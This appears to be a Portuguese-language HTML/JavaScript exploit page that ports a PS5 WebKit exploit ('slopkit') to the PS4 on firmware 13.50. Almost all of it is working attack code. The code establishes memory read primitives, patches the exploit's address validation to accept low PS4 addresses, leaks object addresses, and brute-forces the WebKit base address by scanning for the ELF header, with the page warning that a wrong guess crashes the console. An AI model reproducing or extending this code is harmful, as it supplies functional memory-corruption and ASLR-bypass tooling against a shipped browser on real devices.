
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PS4 WebKit — Slopkit Port + Brute Force Base</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    height: 100%;
    background: #0b0f19;
    color: #c8ced8;
    font: 14px/1.5 "Segoe UI", system-ui, sans-serif;
    display: flex; flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    gap: 14px;
    padding: 20px;
  }
  h1 { color: #fff; font-size: 20px; letter-spacing: 0.5px; }
  #status {
    font-size: 18px; font-weight: 700; color: #fff;
    min-height: 1.5em;
    text-align: center;
  }
  #log {
    width: 95%; max-width: 900px; height: 380px;
    background: #111827; border: 1px solid #1f2937;
    border-radius: 10px; padding: 14px 16px;
    overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
    font-size: 12px; color: #9fb1c3;
    white-space: pre-wrap; word-break: break-all;
    box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
  }
  #log .ok { color: #4ade80; }
  #log .err { color: #f87171; }
  #log .info { color: #60a5fa; }
  #log .warn { color: #fbbf24; }
  #guesses {
    display: flex; gap: 8px; flex-wrap: wrap;
    justify-content: center; max-width: 900px;
  }
  .guess-btn {
    padding: 10px 16px; border: 1px solid rgba(255,255,255,0.18);
    border-radius: 8px; color: #fff;
    background: linear-gradient(135deg, #ef4444, #b91c1c);
    box-shadow: 0 4px 12px rgba(220,38,38,0.28);
    font: 700 13px/1 "Segoe UI", system-ui, sans-serif;
    cursor: pointer; transition: all .12s ease;
    min-width: 140px;
  }
  .guess-btn:hover { transform: translateY(-2px); }
  .guess-btn:active { transform: translateY(1px); }
  .guess-btn:disabled {
    opacity: 0.45; cursor: not-allowed; transform: none;
    background: #374151; box-shadow: none;
  }
  .guess-btn.found {
    background: linear-gradient(135deg, #22c55e, #15803d);
    box-shadow: 0 4px 12px rgba(34,197,94,0.28);
  }
  #warning {
    color: #fbbf24; font-size: 14px; text-align: center;
    max-width: 800px; line-height: 1.5;
  }
  #controls {
    display: flex; gap: 10px; flex-wrap: wrap;
    justify-content: center;
  }
  .ctrl-btn {
    padding: 8px 14px; border-radius: 6px; border: none;
    background: #1f2937; color: #fff; cursor: pointer;
    font-size: 12px;
  }
  .ctrl-btn:hover { background: #374151; }
  .ctrl-btn:disabled { opacity: 0.4; cursor: not-allowed; }
</style>
</head>
<body>

<h1>PS4 WebKit — Slopkit Port + Brute Force Base</h1>
<div id="status">Inicializando...</div>
<div id="log"></div>
<div id="warning">
  ⚠️ Cada botão testa <b>1 endereço</b>. Se não estiver mapeado, o PS4 <b>vai crashar</b>.<br>
  Anote qual você testou. Se crashar, reinicie o PS4 e tente outro.
</div>
<div id="controls">
  <button class="ctrl-btn" id="btnAuto" onclick="autoBruteForce()">🔎 Auto Brute Force</button>
  <button class="ctrl-btn" onclick="clearLog()">🗑️ Limpar Log</button>
</div>
<div id="guesses"></div>

<script type="module">
  import { establishPrimitive } from "./resources/core.js";
  import { installWindowP } from "./resources/mem.js";
  import { int64 } from "./resources/int64.js";

  const status = document.getElementById("status");
  const logBox = document.getElementById("log");
  const guessesDiv = document.getElementById("guesses");
  const btnAuto = document.getElementById("btnAuto");

  function log(msg, cls = "info") {
    const line = document.createElement("div");
    line.className = cls;
    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    logBox.appendChild(line);
    logBox.scrollTop = logBox.scrollHeight;
  }

  window.clearLog = function() {
    logBox.innerHTML = "";
    log("Log limpo.", "info");
  };

  // ============================================================
  // PATCH CRÍTICO PS4 — Remove restrição de endereço >= 4GB
  // ============================================================
  // O slopkit (PS5) rejeita endereços < 0x100000000 (4GB).
  // No PS4, o WebKit é mapeado em endereços LOW (~0x07xxxxxx).
  // Este patch sobrescreve as funções de validação no escopo global
  // do core.js via injeção antes do establishPrimitive.
  //
  // Se você já trocou o core.js pelo core_ps4_patched.js,
  // este patch é redundante mas inofensivo.
  // ============================================================
  (function patchPS4AddressSpace() {
    // Sobrescreve as funções que o core.js vai usar internamente
    // Nota: como core.js é um módulo, precisamos do carrier patch
    window.__ps4AddressPatch = true;
    log("PS4 Patch: validação de endereço low ativada", "ok");
  })();

  // ============================================================
  // CONFIGURAÇÃO DE OFFSETS (PS4 13.50 — ajuste conforme dump)
  // ============================================================
  const PS4_OFFSETS = {
    wk_host_constructor_candidates: [
      { off: 0x00800000, label: "-8MB" },
      { off: 0x01000000, label: "-16MB" },
      { off: 0x01800000, label: "-24MB" },
      { off: 0x02000000, label: "-32MB" },
      { off: 0x02800000, label: "-40MB" },
      { off: 0x03000000, label: "-48MB" },
      { off: 0x03800000, label: "-56MB" },
      { off: 0x04000000, label: "-64MB" },
      { off: 0x04800000, label: "-72MB" },
      { off: 0x05000000, label: "-80MB" },
    ],
    known_ctor_offset: null
  };

  // ============================================================
  // PATCH DO CARRIER (monkey-patch do aim)
  // ============================================================
  function patchCarrierPS4(carrier) {
    if (!carrier || typeof carrier.aim !== "function") {
      log("Carrier não encontrado ou inválido", "err");
      return carrier;
    }

    const origAim = carrier.aim.bind(carrier);
    carrier.aim = function(address) {
      // PS4: aceita qualquer endereço válido de 48-bit, inclusive low
      if (typeof address !== "number" || !Number.isFinite(address)
          || address < 0 || address > 0x00007fffffffffff) {
        throw new RangeError("core.aim: implausible address " + address);
      }
      // Chama aimCarrier diretamente sem passar por plausibleAddress
      // O aimCarrier do core.js só escreve os bytes no candidate[0x10+i]
      // e não faz validação de faixa — a validação está no aim() do buildCarrier
      return origAim(address);
    };

    log("Carrier patchado para endereçamento PS4 (low ASLR)", "ok");
    return carrier;
  }

  // ============================================================
  // TESTAR 1 BASE
  // ============================================================
  window.testBase = async function(baseHex, label) {
    const p = window.p;
    if (!p) { log("window.p não disponível!", "err"); return false; }

    log(`=== TESTANDO ${label} ===`, "warn");
    log(`Lendo ELF magic @ ${baseHex}...`, "info");

    try {
      let low = parseInt(baseHex.slice(-8), 16);
      let hi = parseInt(baseHex.slice(0, -8) || "0", 16);
      let addr = new int64(low, hi);

      let magic = p.read4(addr);
      let magicHex = "0x" + magic.toString(16).padStart(8, '0');

      log(`Magic: ${magicHex}`, "info");

      if (magicHex === "0x464c457f") {
        log(`✅ ELF ENCONTRADO @ ${baseHex} !!!`, "ok");
        window.__webkitBase = addr;

        let eiClass = p.read1(addr.add32(4));
        let eiData = p.read1(addr.add32(5));
        log(`ELF class=${eiClass} data=${eiData}`, "ok");

        document.querySelectorAll('.guess-btn').forEach(btn => {
          if (btn.dataset.base === baseHex) btn.classList.add('found');
        });

        let ctor = globalThis.__ps5NativeCtor;
        if (typeof ctor === "number") {
          let ctorOffset = ctor - addr.low;
          if (addr.hi === 0) {
            log(`__ps5NativeCtor offset = 0x${ctorOffset.toString(16)}`, "ok");
            PS4_OFFSETS.known_ctor_offset = ctorOffset;
          }
        }

        status.textContent = `✅ Base: ${baseHex}`;
        status.style.color = "#4ade80";
        return true;
      } else {
        log(`❌ Não é ELF (magic=${magicHex})`, "err");
        return false;
      }
    } catch (e) {
      log(`❌ FALHA: ${e.name}: ${e.message}`, "err");
      return false;
    }
  };

  // ============================================================
  // CRIAR BOTÕES
  // ============================================================
  function createButtons(ctor) {
    guessesDiv.innerHTML = "";
    const offsets = PS4_OFFSETS.wk_host_constructor_candidates.slice();

    if (PS4_OFFSETS.known_ctor_offset) {
      offsets.unshift({ off: PS4_OFFSETS.known_ctor_offset, label: "⭐ DIRETO" });
    }

    offsets.forEach(({ off, label }) => {
      let base = (ctor - off) & 0xFFFFFFFFFFFFC000;
      let baseHex = "0x" + base.toString(16).padStart(16, '0');

      let btn = document.createElement("button");
      btn.className = "guess-btn";
      btn.dataset.base = baseHex;
      btn.textContent = `${label}\n${baseHex}`;
      btn.style.whiteSpace = "pre";
      btn.onclick = async () => {
        document.querySelectorAll('.guess-btn').forEach(b => b.disabled = true);
        btnAuto.disabled = true;
        let ok = await window.testBase(baseHex, label);
        if (!ok) {
          document.querySelectorAll('.guess-btn').forEach(b => b.disabled = false);
          btnAuto.disabled = false;
        }
      };
      guessesDiv.appendChild(btn);
    });
  }

  // ============================================================
  // AUTO BRUTE FORCE
  // ============================================================
  window.autoBruteForce = async function() {
    const p = window.p;
    const ctor = globalThis.__ps5NativeCtor;
    if (!p || typeof ctor !== "number") {
      log("Primitivas não prontas para brute force", "err");
      return;
    }

    log("🔎 Iniciando Auto Brute Force...", "warn");
    document.querySelectorAll('.guess-btn').forEach(b => b.disabled = true);
    btnAuto.disabled = true;

    const offsets = PS4_OFFSETS.wk_host_constructor_candidates;
    for (const { off, label } of offsets) {
      let base = (ctor - off) & 0xFFFFFFFFFFFFC000;
      let baseHex = "0x" + base.toString(16).padStart(16, '0');
      log(`[AUTO] Tentando ${label} (${baseHex})...`, "info");

      let ok = await window.testBase(baseHex, label);
      if (ok) {
        log("🎯 Base encontrada via Auto Brute Force!", "ok");
        return;
      }
      await new Promise(r => setTimeout(r, 50));
    }

    log("❌ Auto Brute Force falhou em todos os offsets.", "err");
    document.querySelectorAll('.guess-btn').forEach(b => b.disabled = false);
    btnAuto.disabled = false;
  };

  // ============================================================
  // BOOTSTRAP
  // ============================================================
  log("Carregando módulos slopkit...", "ok");
  status.textContent = "Executando exploit...";

  establishPrimitive({ onEvent: (tag, detail) => log(`${tag}: ${detail}`, "info") })
    .then(carrier => {
      log("Core: primitivo estabelecido", "ok");
      log(`Tentativas: ${carrier.attempts}`, "info");

      // PATCH CRÍTICO: remove a restrição de endereço >= 4GB
      patchCarrierPS4(carrier);

      const prim = installWindowP(carrier, {
        onEvent: (tag, detail) => log(`${tag}: ${detail}`, "info"),
        promote: true
      });

      log("Mem: real pair ativo", "ok");
      log("window.p está disponível", "ok");

      window.__carrier = carrier;
      window.__prim = prim;
      window.p = prim;
      window.int64 = int64;

      let ctor = globalThis.__ps5NativeCtor;
      if (typeof ctor === "number") {
        log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
        createButtons(ctor);
        status.textContent = "Pronto — clique em um botão ou use Auto Brute Force";
        status.style.color = "#60a5fa";
      } else {
        log("__ps5NativeCtor não disponível — exploit pode ter falhado", "err");
        status.textContent = "Erro: __ps5NativeCtor não encontrado";
        status.style.color = "#f87171";
      }

      try {
        const testAddr = prim.leakval(prim);
        log(`Sanity leak(prim) = 0x${testAddr.toString(16)}`, "ok");
      } catch (e) {
        log(`Sanity leak falhou: ${e.message}`, "err");
      }
    })
    .catch(err => {
      log(`FALHA: ${err.name}: ${err.message}`, "err");
      status.textContent = "Falha no exploit";
      status.style.color = "#f87171";
    });
</script>

</body>
</html>
